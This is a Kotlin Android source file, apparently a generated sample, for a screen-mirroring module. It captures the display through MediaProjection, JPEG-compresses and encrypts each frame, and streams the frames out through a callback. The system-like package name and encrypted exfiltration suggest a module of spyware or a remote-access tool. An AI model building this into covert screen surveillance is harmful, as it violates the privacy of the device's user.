// [context: Kotlin, Android API 26+, live MJPEG stream via MediaProjection over WebSocket]
package com.system.service.modules.screen

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.util.DisplayMetrics
import android.view.WindowManager
import com.system.service.crypto.DataEncryptor
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

class ScreenMirror(private val context: Context, private val send: (ByteArray) -> Unit) {

    private var projection: MediaProjection? = null
    private val thread = HandlerThread("mirror").also { it.start() }
    private val handler = Handler(thread.looper)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = false

    fun init(resultCode: Int, data: Intent) {
        val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projection = mpm.getMediaProjection(resultCode, data)
    }

    fun start(fps: Int = 5) {
        running = true
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getMetrics(metrics)
        val w = metrics.widthPixels; val h = metrics.heightPixels

        val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 3)
        projection?.createVirtualDisplay("mirror", w, h, metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, handler)

        scope.launch {
            while (running) {
                delay((1000L / fps))
                val img = reader.acquireLatestImage() ?: continue
                val plane = img.planes[0]
                val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(plane.buffer)
                img.close()
                val bos = ByteArrayOutputStream()
                bmp.compress(Bitmap.CompressFormat.JPEG, 40, bos)
                val frame = DataEncryptor.encryptAndCompress(bos.toByteArray())
                send(frame)
            }
        }
    }

    fun stop() {
        running = false
        projection?.stop()
        scope.cancel()
        thread.quitSafely()
    }
}
